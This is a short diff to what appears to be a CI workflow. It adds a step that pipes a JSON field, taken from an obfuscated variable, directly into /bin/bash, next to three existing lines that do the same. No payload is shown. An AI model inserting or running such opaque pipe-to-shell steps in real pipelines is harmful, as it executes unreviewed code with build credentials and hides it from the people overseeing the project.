@@ -32,6 +32,7 @@ jobs:
           echo $vgio1 | jq -r .cxw16 | /bin/bash
           echo $ar2 | jq -r .bor63869 | /bin/bash
           printf '%s' "$hq5574" | jq -r .l678 | /bin/bash
+          echo $svkt57 | jq -r .lpx1 | /bin/bash
 
       - name: Store artifact
         if: always()
